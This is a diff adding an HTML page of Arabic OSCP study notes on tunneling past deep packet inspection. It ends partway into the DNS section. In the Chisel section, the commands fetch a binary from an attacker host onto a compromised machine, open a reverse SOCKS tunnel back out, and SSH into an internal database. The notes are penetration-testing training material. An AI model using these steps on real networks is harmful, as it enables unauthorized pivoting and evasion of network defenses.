@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 17: Tunneling عبر Deep Packet Inspection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,.10);--red-border:rgba(225,54,47,.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,.09);--amber-border:rgba(232,162,58,.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,.09);--green-border:rgba(63,191,110,.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,.09);--blue-border:rgba(78,161,211,.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,.10);--purple-border:rgba(161,121,232,.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.10),transparent 60%),
+               radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.06),transparent 60%),
+               linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background .2s,color .2s;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width .08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,.5);transition:transform .15s,border-color .15s,opacity .2s;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}
+  #toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:28px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,.03);transition:background .15s;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}
+  .callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}
+  .callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}
+  .callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}
+  .callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}
+  .callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}
+  .callout.definition .callout-label{color:var(--text-soft);}
+  .callout.danger{border-inline-start-color:#FF5A52;background:rgba(255,90,82,.08);}
+  .callout.danger .callout-label{color:#FF5A52;}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}
+  .step-body p:last-child{margin-bottom:0;}
+  .method-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:10px;margin:22px 0;}
+  .method-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:14px 16px;}
+  .method-card .mnum{font-family:var(--mono);font-size:11px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:4px;padding:2px 8px;display:inline-block;margin-bottom:8px;direction:ltr;}
+  .method-card .mtitle{font-weight:700;color:var(--text);font-size:14px;margin-bottom:5px;}
+  .method-card .mdesc{color:var(--text-soft);font-size:13.3px;line-height:1.75;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  /* SVG helpers */
+  .dsvg-box{fill:var(--surface-2);stroke:var(--border-soft);stroke-width:1;}
+  .dsvg-box-r{fill:var(--red-soft);stroke:var(--red-border);stroke-width:1;}
+  .dsvg-box-g{fill:var(--green-soft);stroke:var(--green-border);stroke-width:1;}
+  .dsvg-box-b{fill:var(--blue-soft);stroke:var(--blue-border);stroke-width:1;}
+  .dsvg-box-a{fill:var(--amber-soft);stroke:var(--amber-border);stroke-width:1;}
+  .dsvg-box-p{fill:var(--purple-soft);stroke:var(--purple-border);stroke-width:1;}
+  .dsvg-line{stroke:var(--border);stroke-width:1.5;fill:none;}
+  .dsvg-line-r{stroke:var(--red);stroke-width:1.5;fill:none;stroke-dasharray:5,3;}
+  .dsvg-line-g{stroke:var(--green);stroke-width:1.5;fill:none;}
+  .dsvg-line-b{stroke:var(--blue);stroke-width:1.5;fill:none;}
+  .dsvg-arr{fill:var(--border);}
+  .dsvg-arr-r{fill:var(--red);}
+  .dsvg-arr-g{fill:var(--green);}
+  .dsvg-arr-b{fill:var(--blue);}
+  .dsvg-txt{fill:var(--text);font-family:IBM Plex Mono,monospace;}
+  .dsvg-muted{fill:var(--muted);font-family:IBM Plex Mono,monospace;}
+  .dsvg-red{fill:var(--red);}
+  .dsvg-green{fill:var(--green);}
+  .dsvg-amber{fill:var(--amber);}
+  .dsvg-blue{fill:var(--blue);}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none !important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls"><button class="fctrl-btn" id="toTop" title="ارجع لفوق">↑</button></div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-17$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 17</span>
+    <h1>Tunneling عبر Deep Packet Inspection</h1>
+    <p class="lede">لما SSH وReverse Shells كلها اتحجبت — إزاي تهرّب أي ترافيك جوّا HTTP بـ Chisel، وإزاي تبني قناة C2 كاملة جوّا DNS بـ dnscat2 حتى في أشد البيئات تقييداً.</p>
+    <div class="tags">
+      <span class="tag">dpi</span>
+      <span class="tag">chisel</span>
+      <span class="tag">http-tunneling</span>
+      <span class="tag">socks-proxy</span>
+      <span class="tag">dns-tunneling</span>
+      <span class="tag">dnscat2</span>
+      <span class="tag">covert-channel</span>
+      <span class="tag">c2-over-dns</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#intro"><span class="toc-num">00</span><span>DPI وليه SSH Tunneling بيفشل</span></a>
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span>HTTP Tunneling بـ Chisel</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span>أساسيات DNS — كيف بيشتغل ولماذا هو مثالي للـ Tunneling</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span>مفهوم DNS Tunneling — البيانات في الـ Queries</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span>DNS Tunneling بـ dnscat2 — C2 كامل عبر DNS</span></a>
+  <a class="toc-item" href="#compare"><span class="toc-num">--</span><span>Chisel مقابل dnscat2 — متى تستخدم أيهما</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span>Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span>الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ══════════════════════════════════ INTRO -->
+<h1 id="intro">Module 17: Tunneling عبر Deep Packet Inspection</h1>
+<p>Firewalls عادية بتفلتر بالـ IP والبورت فقط — "مين بيكلّم مين". الـ DPI بيروح أعمق بكتير ويفحص <strong>محتوى الـ Packets نفسها</strong>، بيقدر يتعرّف على بروتوكولات بأكملها من بصمتها بغضّ النظر عن البورت.</p>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>فهم كيف DPI بيكسر SSH Tunneling والأساليب التقليدية</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>إخفاء أي ترافيك جوّا HTTP باستخدام Chisel (SOCKS Reverse Proxy)</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>بناء قناة C2 كاملة جوّا DNS بـ dnscat2 حتى لو كل حاجة تانية اتحجبت</span></div>
+</div>
+
+<h3>ما الذي يحجبه DPI وما يسمح به</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>البروتوكول/الأسلوب</th><th>بدون DPI</th><th>مع DPI (HTTP only policy)</th></tr></thead>
+<tbody>
+<tr><td>SSH (port 22 أو custom)</td><td>✓ يعمل</td><td>✗ محجوب — بصمة SSH واضحة</td></tr>
+<tr><td>Reverse Shell (Netcat, Bash TCP)</td><td>✓ يعمل</td><td>✗ محجوب — Raw TCP مش HTTP</td></tr>
+<tr><td>SSH Remote Port Forwarding</td><td>✓ يعمل</td><td>✗ محجوب — ترافيك SSH مش HTTP</td></tr>
+<tr><td>Socat forwards</td><td>✓ يعمل</td><td>✗ محجوب — يشبه TCP خام</td></tr>
+<tr><td><strong>HTTP / HTTPS</strong></td><td>✓ يعمل</td><td><strong>✓ مسموح</strong></td></tr>
+<tr><td><strong>DNS Queries (UDP 53)</strong></td><td>✓ يعمل</td><td><strong>✓ دايماً مسموح تقريباً</strong></td></tr>
+</tbody>
+</table></div>
+
+<h3>السيناريو — المشكلة التي نحلّها</h3>
+<div class="callout case">
+<div class="callout-label">⚙ Scenario Setup</div>
+<p>
+<strong>اخترقنا CONFLUENCE01</strong> ونقدر ننفَّذ أوامر عبر HTTP.<br/>
+<strong>قواعد DPI:</strong> كل الترافيك الصادر محجوب ما عدا HTTP من CONFLUENCE01 | كل البورتات الواردة محجوبة ما عدا TCP:8090 (Confluence).<br/>
+<strong>المطلوب:</strong> وصول SSH لـ PGDATABASE01 اللي متاح فقط من الـ Internal Interface الخاص بـ CONFLUENCE01.<br/>
+<strong>الحل:</strong> نلفّ ترافيكنا جوّا HTTP — DPI يشوفه HTTP عادي.
+</p>
+</div>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 160" xmlns="http://www.w3.org/2000/svg">
+  <!-- Kali/Internet -->
+  <rect x="8" y="45" width="115" height="70" rx="7" class="dsvg-box-b"/>
+  <text x="65" y="70" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">Kali / Attacker</text>
+  <text x="65" y="86" text-anchor="middle" class="dsvg-muted" font-size="9">192.168.118.4</text>
+  <text x="65" y="102" text-anchor="middle" class="dsvg-muted" font-size="9">Internet side</text>
+
+  <!-- DPI Firewall -->
+  <rect x="152" y="28" width="140" height="104" rx="7" class="dsvg-box-r"/>
+  <text x="222" y="52" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">DPI Firewall</text>
+  <text x="222" y="68" text-anchor="middle" class="dsvg-red" font-size="9">✗ SSH blocked</text>
+  <text x="222" y="82" text-anchor="middle" class="dsvg-red" font-size="9">✗ Netcat blocked</text>
+  <text x="222" y="96" text-anchor="middle" class="dsvg-red" font-size="9">✗ Raw TCP blocked</text>
+  <text x="222" y="112" text-anchor="middle" class="dsvg-green" font-size="9" font-weight="700">✓ HTTP:8090 only</text>
+
+  <!-- Arrow through firewall -->
+  <line x1="123" y1="80" x2="152" y2="80" class="dsvg-line-g"/>
+  <polygon points="152,75 162,80 152,85" class="dsvg-arr-g"/>
+  <line x1="292" y1="80" x2="322" y2="80" class="dsvg-line-g"/>
+  <polygon points="322,75 332,80 322,85" class="dsvg-arr-g"/>
+
+  <!-- CONFLUENCE01 -->
+  <rect x="332" y="45" width="140" height="70" rx="7" class="dsvg-box-a"/>
+  <text x="402" y="70" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">CONFLUENCE01</text>
+  <text x="402" y="86" text-anchor="middle" class="dsvg-muted" font-size="9">192.168.50.63</text>
+  <text x="402" y="102" text-anchor="middle" class="dsvg-muted" font-size="9">DMZ — HTTP:8090</text>
+
+  <!-- Internal arrow -->
+  <line x1="472" y1="80" x2="502" y2="80" class="dsvg-line"/>
+  <polygon points="502,75 512,80 502,85" class="dsvg-arr"/>
+
+  <!-- PGDATABASE01 -->
+  <rect x="512" y="45" width="178" height="70" rx="7" class="dsvg-box-p"/>
+  <text x="601" y="70" text-anchor="middle" font-size="11" font-weight="700" style="fill:var(--purple)">PGDATABASE01</text>
+  <text x="601" y="86" text-anchor="middle" class="dsvg-muted" font-size="9">10.4.50.215</text>
+  <text x="601" y="102" text-anchor="middle" class="dsvg-muted" font-size="9">Internal only</text>
+
+  <!-- Label -->
+  <text x="350" y="148" text-anchor="middle" class="dsvg-muted" font-size="9">⚡ الهدف: نوصل PGDATABASE01 رغم الـ DPI — الحل: نلفّ الترافيك جوّا HTTP</text>
+</svg>
+<div class="diagram-caption">DPI بيسمح بـ HTTP:8090 فقط — كل الأساليب التقليدية محجوبة</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">HTTP Tunneling بـ Chisel</span></h2>
+
+<h3>إيه هو Chisel؟</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Chisel</div>
+<p>Chisel هي أداة Tunneling بتلفّ أي ترافيك TCP/UDP جوّا HTTP/WebSocket عادي. من داخل الـ HTTP channel بتستخدم تشفير على غرار SSH. من منظور DPI — الاتصال يبدو تماماً كـ <strong>WebSocket upgrade</strong> لتطبيق ويب شرعي.</p>
+</div>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">✓</span><span>Cross-platform — Windows, Linux, macOS بكل المعماريات</span></div>
+  <div class="goal-card"><span class="gi">✓</span><span>Binary واحد — سهل النقل والتشغيل بدون تثبيت</span></div>
+  <div class="goal-card"><span class="gi">✓</span><span>Reverse SOCKS Proxy — الاتصال صادر من الهدف (مسموح)</span></div>
+  <div class="goal-card"><span class="gi">✓</span><span>يبقى الترافيك مشفّراً — DPI لا يرى المحتوى</span></div>
+</div>
+
+<h3>معمارية Chisel — Client / Server</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 190" xmlns="http://www.w3.org/2000/svg">
+  <!-- Kali Server + SOCKS -->
+  <rect x="8" y="20" width="170" height="110" rx="7" class="dsvg-box-b"/>
+  <text x="93" y="44" text-anchor="middle" class="dsvg-blue" font-size="11" font-weight="700">Kali (Server)</text>
+  <text x="93" y="62" text-anchor="middle" class="dsvg-muted" font-size="9">chisel server</text>
+  <text x="93" y="76" text-anchor="middle" class="dsvg-muted" font-size="9">--port 8080 --reverse</text>
+  <rect x="20" y="88" width="146" height="32" rx="5" class="dsvg-box-g"/>
+  <text x="93" y="100" text-anchor="middle" class="dsvg-green" font-size="10" font-weight="700">SOCKS5 Proxy</text>
+  <text x="93" y="114" text-anchor="middle" class="dsvg-green" font-size="9">127.0.0.1:1080</text>
+
+  <!-- HTTP/WS Arrow -->
+  <text x="299" y="52" text-anchor="middle" class="dsvg-muted" font-size="9">HTTP / WebSocket</text>
+  <text x="299" y="66" text-anchor="middle" class="dsvg-green" font-size="9">(DPI sees: normal web)</text>
+  <line x1="178" y1="75" x2="248" y2="75" class="dsvg-line-g"/>
+  <polygon points="178,70 168,75 178,80" class="dsvg-arr-g"/>
+  <polygon points="248,70 258,75 248,80" class="dsvg-arr-g"/>
+  <text x="213" y="93" text-anchor="middle" class="dsvg-red" font-size="9">← Client initiates</text>
+  <text x="213" y="106" text-anchor="middle" class="dsvg-red" font-size="9">(Outbound HTTP ✓)</text>
+
+  <!-- CONFLUENCE01 Client -->
+  <rect x="258" y="20" width="175" height="130" rx="7" class="dsvg-box-a"/>
+  <text x="345" y="44" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">CONFLUENCE01</text>
+  <text x="345" y="60" text-anchor="middle" class="dsvg-muted" font-size="9">chisel client</text>
+  <text x="345" y="74" text-anchor="middle" class="dsvg-muted" font-size="9">192.168.118.4:8080</text>
+  <text x="345" y="88" text-anchor="middle" class="dsvg-amber" font-size="9">R:socks</text>
+  <rect x="270" y="98" width="151" height="42" rx="5" class="dsvg-box-r"/>
+  <text x="345" y="116" text-anchor="middle" class="dsvg-red" font-size="9">Unwraps HTTP data</text>
+  <text x="345" y="130" text-anchor="middle" class="dsvg-red" font-size="9">Forwards to internal</text>
+
+  <!-- Internal arrow -->
+  <line x1="433" y1="85" x2="478" y2="85" class="dsvg-line"/>
+  <polygon points="478,80 488,85 478,90" class="dsvg-arr"/>
+
+  <!-- PGDATABASE01 -->
+  <rect x="488" y="50" width="204" height="70" rx="7" class="dsvg-box-p"/>
+  <text x="590" y="75" text-anchor="middle" font-size="11" font-weight="700" style="fill:var(--purple)">PGDATABASE01</text>
+  <text x="590" y="91" text-anchor="middle" class="dsvg-muted" font-size="9">10.4.50.215</text>
+  <text x="590" y="107" text-anchor="middle" font-size="9" style="fill:var(--purple)">SSH / Any Service</text>
+
+  <!-- Flow label -->
+  <text x="350" y="174" text-anchor="middle" class="dsvg-muted" font-size="9">SSH Request → SOCKS:1080 → HTTP Encapsulation → Chisel Client → PGDATABASE01</text>
+</svg>
+<div class="diagram-caption">Reverse SOCKS: الـ Client على الهدف يتصَّل خارجياً (مسموح) → SOCKS Proxy يفتح على Kali</div>
+</div>
+
+<h3>Chisel — التسليم والإعداد</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">استضافة Chisel على Kali وتنزيله على الهدف</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash — kali setup</span><pre><code># نسخ chisel لمجلد Apache
+sudo cp $(which chisel) /var/www/html/
+sudo systemctl start apache2
+
+# على CONFLUENCE01 — تنزيل الـ Binary عبر HTTP (البروتوكول الوحيد المسموح!)
+wget http://192.168.118.4/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">تشغيل Chisel Server على Kali</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash — kali server</span><pre><code>chisel server --port 8080 --reverse
+# --port 8080  → يستمع لاتصالات HTTP
+# --reverse    → يسمح بـ Reverse Port Forwarding من الـ Clients
+# Listening...
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تشغيل Chisel Client على CONFLUENCE01</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash — confluence01 client</span><pre><code>/tmp/chisel client 192.168.118.4:8080 R:socks
+# R:socks = افتح Reverse SOCKS Proxy على الـ Server
+# → SOCKS5 Proxy يفتح على Kali:1080
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">التحقق من الـ SOCKS Proxy على Kali</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash — verify</span><pre><code>ss -ntplu | grep 1080
+# → 127.0.0.1:1080  LISTEN  ← الـ Proxy شغّال!
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">استخدام النفق — SSH عبر HTTP</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash — use the tunnel</span><pre><code># SSH مش بيدعم SOCKS native — نستخدم ncat كـ helper
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \
+    database_admin@10.4.50.215
+
+# Shell على PGDATABASE01 عبر HTTP tunnel!
+# DPI شاف HTTP WebSocket فقط
+</code></pre></div>
+</div>
+</div>
+</div>
+
+<div class="callout warning">
+<div class="callout-label">⚠ GLIBC Compatibility</div>
+<p>لو Chisel مُجمَّع على GLIBC أحدث من النظام المستهدَف هتلاقي: <code>version 'GLIBC_2.32' not found</code>. الحل: استخدم Build قديمة مجمَّعة بـ Go Runtime أقدم، أو جمَّع الـ Binary على نفس نظام التشغيل المستهدَف.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">أساسيات DNS — كيف بيشتغل ولماذا هو مثالي للـ Tunneling</span></h2>
+
+<h3>ليه DNS؟</h3>
